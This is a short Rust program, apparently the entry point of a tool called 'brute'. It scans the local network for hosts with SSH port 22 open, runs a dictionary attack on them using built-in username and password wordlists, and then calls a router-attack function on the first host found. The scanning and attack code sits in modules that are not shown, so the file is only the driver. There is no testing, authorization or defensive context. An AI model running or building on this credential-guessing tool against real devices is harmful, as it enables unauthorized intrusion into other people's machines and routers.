use brute::{localnet, bruteforce, wordlist::{USERNAMES, PASSWORDS}, router};

fn main() {
    let targets = localnet::localipstem();
    match targets {
        Some(x) => {
                bruteforce::ssh_wordlist(&x, USERNAMES, PASSWORDS);
                router::attack_router(&x[0]);
            },
        None => println!("no devices have port 22 open! are you sure you are connected to the internet?"),
    }
}

